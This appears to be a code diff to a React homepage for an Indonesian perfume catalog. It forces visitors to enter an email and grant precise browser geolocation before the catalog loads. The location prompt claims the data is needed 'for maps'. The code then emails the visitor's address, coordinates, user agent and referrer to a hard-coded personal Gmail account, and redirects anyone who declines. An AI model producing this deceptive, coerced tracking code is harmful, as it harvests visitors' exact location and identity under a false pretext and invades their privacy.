@@ -4,6 +4,8 @@ import { fetchProductsFromFirestore } from '../api/firestore';
 import { sendVisitNotification } from '../api/email';
 import { Product } from '../types/book';
 
+type Step = 'email' | 'location' | 'denied' | 'catalog';
+
 export default function HomePage() {
   const [products, setProducts] = useState<Product[]>([]);
   const [loading, setLoading] = useState(true);
@@ -12,9 +14,12 @@ export default function HomePage() {
   const [selectedProduct, setSelectedProduct] = useState<Product | null>(null);
   const [showPreview, setShowPreview] = useState(false);
   const [toast, setToast] = useState<string | null>(null);
-  const [visitorEmail, setVisitorEmail] = useState(() => localStorage.getItem('visitorEmail') || '');
-  const [showEmailPopup, setShowEmailPopup] = useState(!localStorage.getItem('visitorEmail'));
+  const [visitorEmail, setVisitorEmail] = useState('');
+  const [step, setStep] = useState<Step>('email');
+  const [location, setLocation] = useState<{ lat: number; lng: number } | null>(null);
+  const [locationError, setLocationError] = useState<string | null>(null);
 
+  // Toast hilang 3 detik
   useEffect(() => {
     if (toast) {
       const t = setTimeout(() => setToast(null), 3000);
@@ -22,27 +27,32 @@ export default function HomePage() {
     }
   }, [toast]);
 
+  // Ambil lokasi
   const getLocation = (): Promise<{ lat: number; lng: number } | null> => {
     return new Promise((resolve) => {
       if (!navigator.geolocation) {
+        setLocationError('Browser tidak support geolocation');
         resolve(null);
         return;
       }
       navigator.geolocation.getCurrentPosition(
-        (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude }),
-        () => resolve(null),
-        { timeout: 5000, enableHighAccuracy: true }
+        (pos) => {
+          setLocation({ lat: pos.coords.latitude, lng: pos.coords.longitude });
+          setLocationError(null);
+          resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude });
+        },
+        (err) => {
+          setLocationError('Izin lokasi ditolak.');
+          resolve(null);
+        },
+        { timeout: 10000, enableHighAccuracy: true }
       );
     });
   };
 
-  const sendNotification = async () => {
-    if (!visitorEmail) {
-      setToast('❌ Email belum diisi.');
-      return;
-    }
+  // Kirim notifikasi (setelah email & lokasi didapat)
+  const sendNotification = async (loc: { lat: number; lng: number } | null) => {
     try {
-      const location = await getLocation();
       await sendVisitNotification('walanton2@gmail.com', {
         visitorEmail,
         userAgent: navigator.userAgent,
@@ -50,8 +60,8 @@ export default function HomePage() {
         referrer: document.referrer || 'Direct',
         timestamp: new Date().toLocaleString('id-ID'),
         url: window.location.href,
-        latitude: location?.lat,
-        longitude: location?.lng,
+        latitude: loc?.lat,
+        longitude: loc?.lng,
       });
       setToast('✅ Notifikasi terkirim!');
     } catch (err) {
@@ -60,19 +70,44 @@ export default function HomePage() {
     }
   };
 
-  useEffect(() => {
-    if (visitorEmail) {
-      sendNotification();
+  // Handle submit email
+  const handleEmailSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!visitorEmail.trim()) {
+      setToast('❌ Email wajib diisi.');
+      return;
     }
-  }, [visitorEmail]);
 
+    // Pindah ke tahap lokasi
+    setStep('location');
+    setToast('📍 Meminta izin lokasi...');
+
+    // Minta lokasi
+    const loc = await getLocation();
+
+    if (!loc) {
+      // Lokasi ditolak → denied
+      setStep('denied');
+      setToast(null);
+      return;
+    }
+
+    // Lokasi diizinkan → kirim notifikasi & tampilkan katalog
+    setLocation(loc);
+    await sendNotification(loc);
+    setStep('catalog');
+    setToast('✅ Notifikasi terkirim!');
+  };
+
+  // Ambil data produk (hanya jika step catalog)
   useEffect(() => {
+    if (step !== 'catalog') return;
     const load = async () => {
       try {
         setLoading(true);
         const data = await fetchProductsFromFirestore();
         if (data.length === 0) {
-          setError('📭 Collection "products" kosong. Tambahkan data di Firebase Console.');
+          setError('📭 Collection "products" kosong.');
         } else {
           setProducts(data);
         }
@@ -83,7 +118,7 @@ export default function HomePage() {
       }
     };
     load();
-  }, []);
+  }, [step]);
 
   const filtered = products.filter(p =>
     p.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
@@ -91,16 +126,182 @@ export default function HomePage() {
     p.gender.toLowerCase().includes(searchQuery.toLowerCase())
   );
 
-  const handleEmailSubmit = (e: React.FormEvent) => {
-    e.preventDefault();
-    if (visitorEmail.trim()) {
-      localStorage.setItem('visitorEmail', visitorEmail.trim());
-      setShowEmailPopup(false);
-    }
-  };
+  const SHOP_LINK = 'https://shop.example.com'; // Ganti dengan link shop Anda
 
-  const SHOP_LINK = 'https://aparfume.wordpress.com/purchase-order/'; // Ganti dengan link shop Anda
+  // ========== RENDER ==========
 
+  // 1. Popup email
+  if (step === 'email') {
+    return (
+      <>
+        <Header />
+        <div style={{
+          position: 'fixed',
+          top: 0,
+          left: 0,
+          right: 0,
+          bottom: 0,
+          background: 'rgba(0,0,0,0.7)',
+          display: 'flex',
+          alignItems: 'center',
+          justifyContent: 'center',
+          zIndex: 9999,
+          padding: '1rem',
+        }}>
+          <div style={{
+            background: 'white',
+            borderRadius: '16px',
+            padding: '2rem',
+            maxWidth: '400px',
+            width: '100%',
+            textAlign: 'center',
+          }}>
+            <h3>📧 Masukkan Email Anda</h3>
+            <p style={{ fontSize: '0.9rem', color: '#6b7280' }}>
+              Wajib diisi untuk mengakses katalog.
+            </p>
+            <form onSubmit={handleEmailSubmit}>
+              <input
+                type="email"
+                placeholder="contoh@email.com"
+                value={visitorEmail}
+                onChange={(e) => setVisitorEmail(e.target.value)}
+                required
+                style={{
+                  width: '100%',
+                  padding: '0.75rem',
+                  border: '2px solid #e5e7eb',
+                  borderRadius: '8px',
+                  fontSize: '1rem',
+                  marginBottom: '1rem',
+                  outline: 'none',
+                }}
+              />
+              <button
+                type="submit"
+                style={{
+                  width: '100%',
+                  padding: '0.75rem',
+                  background: '#3b82f6',
+                  color: 'white',
+                  border: 'none',
+                  borderRadius: '8px',
+                  fontSize: '1rem',
+                  cursor: 'pointer',
+                }}
+              >
+                Kirim & Lanjutkan
+              </button>
+            </form>
+          </div>
+        </div>
+      </>
+    );
+  }
+
+  // 2. Popup location / denied
+  if (step === 'location') {
+    return (
+      <>
+        <Header />
+        <div style={{
+          position: 'fixed',
+          top: 0,
+          left: 0,
+          right: 0,
+          bottom: 0,
+          background: 'rgba(0,0,0,0.7)',
+          display: 'flex',
+          alignItems: 'center',
+          justifyContent: 'center',
+          zIndex: 9999,
+          padding: '1rem',
+        }}>
+          <div style={{
+            background: 'white',
+            borderRadius: '16px',
+            padding: '2rem',
+            maxWidth: '400px',
+            width: '100%',
+            textAlign: 'center',
+          }}>
+            <h3>📍 Meminta Izin Lokasi</h3>
+            <p style={{ fontSize: '0.9rem', color: '#6b7280', marginBottom: '1rem' }}>
+              Kami membutuhkan lokasi akurat Anda untuk maps.
+              <br />
+              <small>Izin akan diminta oleh browser.</small>
+            </p>
+            <div style={{ width: '100%', height: '4px', background: '#e5e7eb', borderRadius: '4px', overflow: 'hidden' }}>
+              <div style={{ width: '100%', height: '100%', background: '#3b82f6', animation: 'pulse 1.5s infinite' }} />
+            </div>
+            <p style={{ fontSize: '0.8rem', color: '#6b7280', marginTop: '1rem' }}>
+              Menunggu izin...
+            </p>
+            <style>{`
+              @keyframes pulse {
+                0% { opacity: 0.3; }
+                50% { opacity: 1; }
+                100% { opacity: 0.3; }
+              }
+            `}</style>
+          </div>
+        </div>
+      </>
+    );
+  }
+
+  // 3. Denied (lokasi ditolak)
+  if (step === 'denied') {
+    return (
+      <>
+        <Header />
+        <div style={{
+          position: 'fixed',
+          top: 0,
+          left: 0,
+          right: 0,
+          bottom: 0,
+          background: 'rgba(0,0,0,0.8)',
+          display: 'flex',
+          alignItems: 'center',
+          justifyContent: 'center',
+          zIndex: 9999,
+          padding: '1rem',
+        }}>
+          <div style={{
+            background: 'white',
+            borderRadius: '16px',
+            padding: '2rem',
+            maxWidth: '400px',
+            width: '100%',
+            textAlign: 'center',
+          }}>
+            <div style={{ fontSize: '3rem', marginBottom: '0.5rem' }}>🚫</div>
+            <h3>Akses Ditolak</h3>
+            <p style={{ fontSize: '0.9rem', color: '#6b7280', marginBottom: '1.5rem' }}>
+              Anda harus mengizinkan lokasi untuk mengakses katalog.
+            </p>
+            <button
+              onClick={() => window.location.href = 'https://www.google.com'}
+              style={{
+                padding: '0.75rem 2rem',
+                background: '#ef4444',
+                color: 'white',
+                border: 'none',
+                borderRadius: '8px',
+                fontSize: '1rem',
+                cursor: 'pointer',
+              }}
+            >
+              Tutup
+            </button>
+          </div>
+        </div>
+      </>
+    );
+  }
+
+  // 4. Catalog (step === 'catalog')
   if (loading) {
     return (
       <>
@@ -130,7 +331,7 @@ export default function HomePage() {
       <>
         <Header />
         <div style={{ padding: '2rem', textAlign: 'center' }}>
-          <p>📭 Belum ada produk. Tambahkan data di collection "products".</p>
+          <p>📭 Belum ada produk.</p>
         </div>
       </>
     );
@@ -140,67 +341,6 @@ export default function HomePage() {
     <>
       <Header />
       <div style={{ padding: '1rem', maxWidth: '1200px', margin: '0 auto' }}>
-        {showEmailPopup && (
-          <div style={{
-            position: 'fixed',
-            top: 0,
-            left: 0,
-            right: 0,
-            bottom: 0,
-            background: 'rgba(0,0,0,0.7)',
-            display: 'flex',
-            alignItems: 'center',
-            justifyContent: 'center',
-            zIndex: 9999,
-            padding: '1rem',
-          }}>
-            <div style={{
-              background: 'white',
-              borderRadius: '16px',
-              padding: '2rem',
-              maxWidth: '400px',
-              width: '100%',
-              textAlign: 'center',
-            }}>
-              <h3>📧 Masukkan Email Anda</h3>
-              <p style={{ fontSize: '0.9rem', color: '#6b7280' }}>Kami akan kirim notifikasi ke admin.</p>
-              <form onSubmit={handleEmailSubmit}>
-                <input
-                  type="email"
-                  placeholder="contoh@email.com"
-                  value={visitorEmail}
-                  onChange={(e) => setVisitorEmail(e.target.value)}
-                  required
-                  style={{
-                    width: '100%',
-                    padding: '0.75rem',
-                    border: '2px solid #e5e7eb',
-                    borderRadius: '8px',
-                    fontSize: '1rem',
-                    marginBottom: '1rem',
-                    outline: 'none',
-                  }}
-                />
-                <button
-                  type="submit"
-                  style={{
-                    width: '100%',
-                    padding: '0.75rem',
-                    background: '#3b82f6',
-                    color: 'white',
-                    border: 'none',
-                    borderRadius: '8px',
-                    fontSize: '1rem',
-                    cursor: 'pointer',
-                  }}
-                >
-                  Kirim & Lanjutkan
-                </button>
-              </form>
-            </div>
-          </div>
-        )}
-
         {toast && (
           <div style={{
             position: 'fixed',
@@ -214,6 +354,8 @@ export default function HomePage() {
             zIndex: 9999,
             boxShadow: '0 4px 12px rgba(0,0,0,0.2)',
             animation: 'fadeInDown 0.3s ease-out',
+            maxWidth: '90%',
+            textAlign: 'center',
           }}>
             {toast}
           </div>
